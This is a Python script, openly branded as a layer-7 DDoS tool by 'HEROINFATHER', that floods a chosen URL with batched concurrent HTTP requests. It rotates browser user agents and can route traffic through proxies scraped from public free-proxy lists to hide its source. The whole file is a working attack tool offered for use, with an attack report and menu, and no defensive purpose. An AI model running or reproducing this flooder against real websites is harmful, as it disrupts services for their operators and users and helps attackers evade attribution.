import sys
import requests
import asyncio
import aiohttp
import random
from bs4 import BeautifulSoup
from datetime import datetime
import time
import os

# ASCII Art
ASCII_ART = """
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⠛⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉⠀⣠⣶⣶⣄⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⣀⣶⣿⣿⣿⣿⣿⣆⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠁⢀⣤⣶⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⢀⣠⣾⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠋⠀⢀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠈⠉⠉⠙⠛⠛⠻⢿⣿⡿⠟⠁⠀⣀⣴⣿⣿⣿⣿⣿⠟⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠛⣉⣡⠀⣠⣴⣶⣶⣦⠄⣀⡀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⡿⢃⣾⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⣾⣤⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⣠⣾⡟⢡⣾⣿⣿⣿⡿⢋⣴⣿⡿⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⢡⣾⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠃⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⣼⣿⡟⣰⣿⣿⣿⣿⠏⣰⣿⣿⠟⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢚⣛⢿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠸⣿⠟⢰⣿⣿⣿⣿⠃⣾⣿⣿⠏⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⣾⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠻⠻⠃⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⢉⣴⣿⣿⣿⣿⡇⠘⣿⣿⠋⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡘⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⣿⣿⣿⣿⠁⢀⣀⠀⢀⣾⣿⣿⣿⣿⣿⣿⠟⠉⠉⠉⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⣀⣤⡀⠀⠈⠻⢿⠀⣼⣿⣷⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠟⠛⠙⠃⠀⣿⣿⣿⠀⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⡿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠛⠁⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⠟⠁⢀⣴⣶⣶⣾⣿⣿⣿⣿⣶⡐⢦⣄⠀⠀⠈⠛⢿⣿⣿⣿⣿⡀⠀⠀⠀⠀⢀⣼⡿⢛⣩⣴⣶⣶⣶⣶⣶⣶⣭⣙⠻⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿
⣿⠁⠀⣴⣿⣿⣿⣿⠿⠿⣿⣿⣿⣿⣿⣦⡙⠻⣶⣄⡀⠀⠈⠙⢿⣿⣷⣦⣤⣤⣴⣿⡏⣠⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣌⠻⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿
⣿⠁⠀⢸⣿⣿⣿⠋⣠⠔⠀⠀⠻⣿⣿⣿⣿⢉⡳⢦⣉⠛⢷⣤⣀⠀⠈⠙⠿⣿⣿⣿⣿⢸⣿⡄⠻⣿⣿⠟⡈⣿⣿⣿⣿⣿⢉⣿⣧⢹⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿
⣿⠁⠀⢸⣿⣿⡇⠠⡇⠀⠀⠀⠀⣿⣿⣿⣿⢸⣿⣷⣤⣙⠢⢌⡛⠷⣤⣄⠀⠈⠙⠿⣿⣿⣿⣿⣷⣦⣴⣾⣿⣤⣙⣛⣛⣥⣾⣿⣿⡌⣿⣿⣿⣷⣤⣀⣀⣀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿
⣿⠁⠀⢸⣿⣿⣷⡀⠡⠀⠀⠀⣰⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣦⣌⡓⠤⣙⣿⣦⡄⠀⠈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢡⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⠁⠀⢸⣿⣿⣿⣿⣶⣤⣴⣾⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣷⠀⣶⡄⠀⠈⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢃⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⠁⠀⢸⣿⣿⣿⣿⣿⠟⠻⣿⣿⡏⣉⣭⣭⡘⠻⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⣿⡇⢸⡇⢠⡀⠈⠙⠋⠉⠉⠉⠉⠛⠫⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⠁⠀⢸⣿⣿⠛⣿⣿⣀⣀⣾⡿⢀⣿⣿⣿⢻⣷⣦⢈⡙⠻⢿⣿⣿⣿⣿⣿⣿⣿⠀⣿⡇⢸⡇⢸⣿⠀⣦⠀⠀⠶⣶⣦⣀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⠁⠀⢸⣿⣿⣦⣈⡛⠿⠟⣋⣤⣾⣿⣿⣿⣸⣿⣿⢸⡇⢰⡆⢈⡙⠻⢿⣿⣿⣿⠀⢿⡇⢸⡇⢸⣿⢠⣿⡇⣿⡆⢈⡙⠻⠧⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⠁⠀⠀⣝⠛⢿⣿⣿⣿⣿⣿⣿⠟⣁⠀⠀⢈⠛⠿⢸⣇⢸⡇⢸⡇⣶⣦⣌⡙⠻⢄⡀⠁⠘⠇⠘⣿⢸⣿⡇⣿⡇⢸⡛⠷⣦⣄⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡆⠀⠈⠳⢶⣤⣍⡉⠉⣩⣤⣤⡉⠻⢶⣤⣀⠂⠀⠉⠘⠇⢸⡇⣿⣿⣿⣿⣷⣦⣍⡑⠢⣄⠀⠈⠈⠻⠇⣿⡇⢸⣿⣷⣾⣿⡇⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣷⣦⣄⡀⠈⠉⠛⠶⢄⡉⠻⠿⣷⣦⣌⡙⠷⢶⣄⡀⠀⠈⠁⠙⢿⣿⣿⣿⣿⣿⣿⣷⣦⣍⡒⠤⣀⠀⠈⠃⢸⣿⣿⣿⣿⣷⠀⢸⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿
⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄⡀⠀⠈⠉⠂⠄⢙⣿⣿⣷⣦⣈⠙⠳⢦⣄⡀⠠⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣌⡐⠄⢸⣿⣿⣿⣿⣿⡇⠀⣿⠿⣿⣿⣿⣿⣷⣌⠻⣿⣿⣿⡿⢰⣦⣤⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣄⡀⠀⠀⠀⠉⠛⠛⠛⠿⠷⣤⣈⠛⠷⢤⣈⡂⢄⡉⠻⠿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣌⡛⠿⣿⣿⡇⠀⢿⣷⣌⡛⠿⠿⠏⣼⣷⣤⣉⣉⣀⣼⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡷⠀⢀⣤⣶⣦⣤⣤⣄⡈⠙⠻⠖⠀⣉⣩⣤⣤⣤⣤⣤⣤⣀⡈⠉⠙⠻⣿⣿⣿⣿⣶⡄⠉⠀⠀⣸⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⣾⣿⣿⣿⣿⣿⣿⣿⠀⠀⣴⣿⣿⣿⣿⣿⠟⣩⣽⣿⣿⣿⣷⣦⣀⠀⠙⢻⣿⣿⠇⠀⣠⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⠏⣵⣾⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠉⠻⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⡇⠘⣿⣿⡿⣡⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢟⣦⡀⠀⠸⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢀⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢀⣙⣟⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣘⣛⣻⣦⢀⣀⣙⣛⣛⣛⣛⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
                                                 
           DDOS ATTACK LAYER 7 | V 1.2.7
        
       DEVELOPER : HEROINFATHER | OWN TEAM
       GITHUB : https://github.com/Jcllynnaf                                                  
                                                                                                       
                                                                              
                                                                                                                                                                          
"""

# Basic configuration
DEFAULT_REQUESTS = 1000
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/91.0.864.59",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

# List of Proxy sources
PROXY_SOURCES = [
    "https://www.us-proxy.org",
    "https://www.socks-proxy.net",
    "https://proxyscrape.com/free-proxy-list",
    "https://www.proxynova.com/proxy-server-list/",
    "https://proxybros.com/free-proxy-list/",
    "https://proxydb.net/",
    "https://spys.one/en/free-proxy-list/",
    "https://hasdata.com/free-proxy-list",
    "https://www.proxyrack.com/free-proxy-list/",
    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all",
]

# Function to get a list of proxy from online sources
async def fetch_proxies(source):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(source) as response:
                if response.status == 200:
                    html = await response.text()
                    # Adjust HTML parsing based on the source
                    if "us-proxy.org" in source or "socks-proxy.net" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'id': 'proxylisttable'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "proxyscrape.com" in source:
                        proxies = html.strip().split('\r\n')
                        return ["http://" + proxy for proxy in proxies]
                    elif "proxynova.com" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'id': 'tbl_proxy_list'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "proxybros.com" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'table'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "proxydb.net" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'table table-sm'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "spys.one" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'spy1xx'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "freeproxy.world" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'table table-striped table-bordered'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "hasdata.com" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'proxies'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "proxyrack.com" in source:
                        soup = BeautifulSoup(html, 'html.parser')
                        proxy_table = soup.find('table', {'class': 'table table-striped'})
                        proxies = []
                        for row in proxy_table.find_all('tr')[1:]:
                            columns = row.find_all('td')
                            ip = columns[0].text.strip()
                            port = columns[1].text.strip()
                            proxies.append(f"http://{ip}:{port}")
                        return proxies
                    elif "api.proxyscrape.com" in source:
                         proxies = html.strip().split('\r\n')
                         return proxies
                    else:
                        print(f"Cannot process proxy sources: {source}")
                        return []
                else:
                    print(f"Failed to fetch proxies from {source}. Status code: {response.status}")
                    return []
    except Exception as e:
        print(f"Error fetching proxies from {source}: {e}")
        return []

# Function to collect proxy from all sources
async def get_all_proxies():
    all_proxies = []
    for source in PROXY_SOURCES:
        proxies = await fetch_proxies(source)
        if proxies:
            all_proxies.extend(proxies)
            print(f"Managed to take {len(proxies)} Proxy from {source}")
        else:
            print(f"Failed to take a proxy from {source}")
    return all_proxies

# Function for cleaning the screen
def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

# Function to display progress loading (updated for speed)
def show_progress(progress, total=100, length=50):
    percent = (progress / float(total)) * 100
    bar = '#' * int(length * progress / float(total))
    spaces = ' ' * (length - len(bar))
    print(f'\r[{bar}{spaces}] {percent:.2f}%', end='', flush=True)  # Use print directly

# Function for carrying out ddos ​​attacks (accelerated)
async def attack(url, session, stealth_mode, proxy=None):
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    try:
        if proxy:
            async with session.get(url, headers=headers, proxy=proxy, timeout=5) as response:  # Reduce timeout
                return "Succeed"
        else:
            async with session.get(url, headers=headers, timeout=5) as response:  # Reduce timeout
                return "Succeed"
    except:
        return "Failed"

# The main function for carrying out attacks simultaneously (accelerated)
async def flood(url, num_requests, stealth_mode, use_proxy, proxies):
    clear_screen()
    print(ASCII_ART)  # Print Ascii Art Before the Message of Attack

    print(f"Attack {url} with {num_requests} request.\n")

    success_count = 0
    failure_count = 0
    start_time = time.time()

    async with aiohttp.ClientSession() as session:
        tasks = []
        for i in range(num_requests):
            proxy = random.choice(proxies) if proxies else None
            task = asyncio.create_task(attack(url, session, stealth_mode, proxy))
            tasks.append(task)

            if len(tasks) >= 500:  # Limit the number of tasks to prevent overload
                results = await asyncio.gather(*tasks)
                success_count += results.count("Succeed")
                failure_count += results.count("Fail")
                tasks = []  # Reset the task list
                show_progress((i + 1) / num_requests * 100)  # Show Progress

        # The remaining assignment process
        if tasks:
            results = await asyncio.gather(*tasks)
            success_count += results.count("Succeed")
            failure_count += results.count("Fail")
            show_progress(100)  # Make sure the progress reaches 100%

    end_time = time.time()
    elapsed_time = end_time - start_time

    print("\n\n===== 💣 Attack report 💣 =====")
    print(f"URL Target: {url}")
    print(f"Number of requests: {num_requests}")
    print(f"The attack was successful: {success_count}")
    print(f"The attack failed: {failure_count}")
    print(f"Time spent: {elapsed_time:.2f} second")
    print("==========================")

# Function to display menus and get input from users
def show_menu():
    print("\n===== 🎭 HeroIn-DDoS Tool 🎭 =====")
    print("1. Target URL")
    print("2. Threads (Default: {})".format(DEFAULT_REQUESTS))
    print("3. Stealth Mode (At the moment: {})".format("Active" if stealth_mode else "Non-active"))
    print("4. Proxy (At the moment: {})".format("Active" if use_proxy else "Non-active"))
    print("5. Attack")
    print("6. Exit")
    print("===============================")
    print("Selection: ")
    choice = input("Select the option: ")
    return choice

# Global variable for storing options
url = None
num_requests = DEFAULT_REQUESTS
stealth_mode = False
use_proxy = False
proxies = []  # A list of proxy to be used
ascii_printed = False  # Add variables to track whether ASCII has been printed

# The main function that processes the menu and starts attacks
def main():
    global url, num_requests, stealth_mode, use_proxy, proxies, ascii_printed

    if not ascii_printed:  # Print Ascii only once
        print(ASCII_ART)
        ascii_printed = True

    while True:
        choice = show_menu()

        if choice == '1':
            url = input("Enter the URL target: ")
        elif choice == '2':
            try:
                num_requests = int(input("Enter the amount of demand: "))
            except ValueError:
                print("Input invalid. Using the number of default requests.")
                num_requests = DEFAULT_REQUESTS
        elif choice == '3':
            stealth_mode = not stealth_mode
            print("Stealth mode now: {}".format("Active" if stealth_mode else "Non-active"))
        elif choice == '4':
            use_proxy = not use_proxy
            print("Use of the current proxy: {}".format("Active" if use_proxy else "Non-active"))
            if use_proxy:
                print("Take a proxy list...")
                proxies = asyncio.run(get_all_proxies())
                if proxies:
                    print(f"Managed to take {len(proxies)} proxy.")
                else:
                    print("Failed to take a proxy.The attack will continue without a proxy.")
                    use_proxy = False
            else:
                proxies = []
        elif choice == '5':
            if not url:
                print("The URL target has not been entered.Please enter the URL first.")
            else:
                clear_screen()  # Clean the screen before printing ASCII
                print(ASCII_ART) # Print ascii art in the second interface
                print("Starting the attack...")
                asyncio.run(flood(url, num_requests, stealth_mode, use_proxy, proxies))
                print("The attack was over.")
        elif choice == '6':
            print("\n--GOOD BYE FRIEND--")
            break
        else:
            print("Invalid options.Please try lagi.")

if __name__ == "__main__":
    main()
